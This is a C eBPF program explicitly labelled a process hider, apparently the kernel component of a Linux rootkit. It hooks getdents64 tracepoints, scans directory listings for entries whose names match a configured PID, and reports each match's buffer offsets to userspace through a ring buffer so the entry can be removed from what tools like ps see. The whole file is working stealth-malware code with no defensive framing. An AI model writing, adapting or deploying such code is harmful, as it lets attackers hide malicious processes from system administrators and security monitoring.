//go:build ignore
// SPDX-License-Identifier: GPL-2.0
// Process hider - optimized for kernel 5.10 verifier complexity limits
// Key insight: store PID as a u64 for single-comparison matching
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define NAME_MAX 16

struct hide_event {
    u32 caller_pid;
    u32 caller_tid;
    u64 buf_addr;
    u64 entry_offset;
    u16 entry_reclen;
    u16 prev_reclen;
    u32 _pad;
    u64 prev_offset;
    s64 total_size;
    char d_name[NAME_MAX];
};

struct getdents_args { u64 dirp; };

struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct getdents_args); } args_map SEC(".maps");

// Store PID string as a u64 for fast comparison (up to 8 chars)
// e.g., PID "12345" stored as bytes 0x31,0x32,0x33,0x34,0x35,0x00,0x00,0x00
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_val_map SEC(".maps");

// Mask for comparison (only compare relevant bytes)
// e.g., for 5-digit PID: mask = 0x000000FFFFFFFFFF
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_mask_map SEC(".maps");

struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
         __uint(max_entries, 256 * 1024); } events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_sys_enter_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 dirp = 0;
    bpf_probe_read(&dirp, sizeof(dirp), ctx + 24);
    struct getdents_args a = { .dirp = dirp };
    bpf_map_update_elem(&args_map, &tid, &a, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_sys_exit_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;
    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);

    struct getdents_args *a = bpf_map_lookup_elem(&args_map, &tid);
    if (!a) return 0;
    u64 dirp = a->dirp;
    bpf_map_delete_elem(&args_map, &tid);
    if (ret <= 0) return 0;

    u32 zero = 0;
    u64 *pid_val = bpf_map_lookup_elem(&pid_val_map, &zero);
    if (!pid_val) return 0;
    u64 target = *pid_val;

    u64 *pid_mask = bpf_map_lookup_elem(&pid_mask_map, &zero);
    if (!pid_mask) return 0;
    u64 mask = *pid_mask;

    long off = 0, prev_off = -1;
    u16 prev_reclen = 0;

    // Ultra-lightweight loop: single u64 comparison per entry
    for (int i = 0; i < 256; i++) {
        if (off >= ret) break;

        u16 d_reclen = 0;
        if (bpf_probe_read_user(&d_reclen, 2, (void *)(dirp + off + 16)) < 0)
            break;
        if (d_reclen == 0 || d_reclen > 4096)
            break;

        // Read first 8 bytes of d_name as a u64
        u64 name_val = 0;
        bpf_probe_read_user(&name_val, 8, (void *)(dirp + off + 19));

        // Masked comparison — matches PID string exactly
        if ((name_val & mask) == target) {
            char d_name[NAME_MAX] = {};
            bpf_probe_read_user_str(d_name, NAME_MAX, (void *)(dirp + off + 19));

            struct hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
            if (e) {
                e->caller_pid = pid;
                e->caller_tid = tid;
                e->buf_addr = dirp;
                e->entry_offset = (u64)off;
                e->entry_reclen = d_reclen;
                e->prev_reclen = prev_reclen;
                e->prev_offset = (u64)prev_off;
                e->total_size = ret;
                __builtin_memcpy(e->d_name, d_name, NAME_MAX);
                bpf_ringbuf_submit(e, 0);
            }
            return 0;
        }

        prev_off = off;
        prev_reclen = d_reclen;
        off += d_reclen;
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
